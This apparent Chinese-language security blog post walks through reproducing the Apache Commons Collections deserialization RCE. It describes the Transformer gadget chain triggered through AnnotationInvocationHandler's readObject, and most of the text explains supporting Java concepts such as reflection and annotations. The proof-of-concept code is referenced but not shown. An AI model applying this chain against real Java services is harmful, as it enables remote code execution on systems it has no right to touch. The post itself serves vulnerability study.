Apache-CommonsCollections反序列化漏洞复现

发表于 2021-03-24
字数统计: 5k | 阅读时长 ≈ 19

前言

Apache-CommonsCollections序列化RCE漏洞主要问题在org.apache.commons.collections.Transformer接口上。
利用三个实现接口的类构造出payload，
配合sun.reflect.annotation.AnnotationInvocationHandler 中重写的 readObject()，可以触发payload执行。
网络上的poc如下,用到的第三方包需要自行下载导入。
复现环境 windows10家庭版 jdk1.7

由于是在windows下复现的漏洞，最后exec函数执行的命令我修改为calc了。

执行流程分析

分析poc的代码也不难看出，Reverse_Payload函数利用反射获取了AnnotationInvocationHandler类的构造函数，随后用构造的outmap实例化了一个AnnotationInvocationHandler类对象并将之返回。
而GeneratePayload函数就是将Reverse_Payload函数返回的AnnotationInvocationHandler实例序列化后写入到文件中。
随后payloadTest函数将保存在文件中的字节流读取进行反序列化，在反序列化过程中触发恶意代码的执行。
上述poc并没有模拟服务端，而是直接在本地模拟了一次序列化与反序列化的过程，不过不影响我们学习其中的原理。

这里补充一点java基础小知识
接口不是类，所以不能用new运算符实例化一个接口，也就是说不能像这样
x = new Transformer(...)
不过，虽然不能构造接口的实例，但是可以声明接口的变量，也就是这样
Transformer x; //ok
不过接口变量必须引用实现了这个接口的类对象，像这样
x = new ConstantTransformer(Runtime.class);//ok
因为ConstantTransformer实现了Transformer接口，所以没问题。上面的Transformer数组同理。

这里用到了Method.invoke方法，补充一点方法的说明

翻译一下就是：
用指定的参数在指定的对象上调用该Method对象所代表的底层方法。单个参数自动解包为与基元形式参数相匹配，基元参数和引用参数都要根据需要进行方法调用转换。

如果底层方法是静态的，那么指定的obj参数将被忽略。它可以是null。

如果底层方法所需的形式参数数为0，则提供的args数组长度可以是0，也可以是null。

如果底层方法是实例方法，则使用《Java语言规范》第15.12.4.4节中记载的动态方法查找来调用它；特别是，可能会发生基于目标对象的运行时类型的覆盖。

如果底层方法是静态的，那么声明该方法的类如果还没有被初始化，就会被初始化。

如果方法正常完成，则将其返回的值返回给调用invoke的调用者(也就是第一个参数obj)；如果该值具有基元类型，则首先将其适当地封装在一个对象中。但是，如果值的类型为基元类型的数组，则数组的元素不被包裹在对象中，换句话说，返回的是一个基元类型的数组。如果底层方法返回类型为void，则调用返回null。
额外补充一下：
Method.invoke(obj, args)方法第一个参数是隐式参数(java核心技术卷一p216)
隐式参数，譬如定义了一个类A，这个类有方法test(int t)
调用方法的时候一般都是 A x = new A();
x.test(2);
此处的x，我们称之为隐式参数，它代表了A这个类的一个实例，告诉了程序此处执行的test方法是谁的test方法。

下面的分析及到注解的知识

Annotation(注解)是java1.5中引入的机制
java中的类，方法，变量，参数和包等都可以被标注。java虚拟机可以保留标注内容
关于注解的学习，推荐看这一篇文章 https://www.runoob.com/w3cnote/java-annotation.html
元注解：
作用于注解的注解，比如@Retention和@Target还有@Documented就是三个元注解
他们用于标识一个注解的RetentionPolicy属性和ElementType属性还有注解是否出现在javadoc中
Target元注解和ElementType枚举类是配合使用的
对于ElementType枚举类

这个枚举类型的常量提供了对Java程序中注释可能出现的语法位置的简单分类。这些常量在 Target 元注解中用于指定在什么地方写给定类型的注解是合法的。
注释可能出现的语法位置分为声明上下文（声明上下文中的注解适用于声明）和类型上下文（类型上下文中的注解适用于声明和表达式中使用的类型）。
例如，一个类型为@Target(ElementType.FIELD)的元注解只能被写成字段声明的修饰符。
一个类型为@Target(ElementType.METHOD)的元注解只能被写成方法声明的修饰符。

Retention元注解和RetentionPolicy枚举类也是配合使用的
对于RetentionPolicy枚举类

注释保留政策。这个枚举类型的常量描述了保留注解的各种策略，它们与保留元注解类型(Retention)一起使用，指定注解的保留时间。它们与保留元注解类型一起使用，指定注解的保留时间。

SOURCE     /* Annotation信息仅存在于编译器处理期间，编译器处理完之后就没有该Annotation信息了  */

CLASS     /* 编译器将Annotation存储于类对应的.class文件中。默认行为  */

RUNTIME  /* 编译器将Annotation存储于class文件中，并且可由JVM读入 */

注解有以下特性：

  1. 一个Annotation(java注解)和一个RetentionPolicy关联，也就是说对每个Annotation对象，有唯一的RetentionPolicy属性
  2. 一个Annotation(java注解)和一个或多个ElementType关联,也就是说对每个Annotation对象，有若干个ElementType属性
  3. Annotation接口有许多实现类，包括Deprecated，Documented，Override等等
    可以像这样定义一个注解 这个注解可以这么用 更多的相关知识真的推荐看上面的链接，讲得非常详细。
